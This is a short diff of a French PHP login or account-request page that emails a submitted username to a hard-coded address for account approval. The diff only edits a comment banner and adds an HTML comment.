@@ -71,9 +71,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $mailObj->Port = MAIL_PORT;
 
             $mailObj->setFrom(MAIL_FROM, MAIL_FROM_NAME);
-####################### change mail there #######################
+####################### change mail there -> allow new account ####################### 
             $mailObj->addAddress("erzasu45.008@gmail.com");
-#################################################################
+######################################################################################
             $mailObj->isHTML(true);
             $contentHtml = "
             Utilisateur: $username<br>
@@ -112,6 +112,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <!DOCTYPE html>
 <html lang="fr">
 <head>
+    <!-- html: Login form -->
     <meta charset="UTF-8">
     <link rel="icon" href="/style/images/cereep32.ico" type="image/x-icon">
     <link rel="shortcut icon" href="/style/images/cereep32.ico" type="image/x-icon">
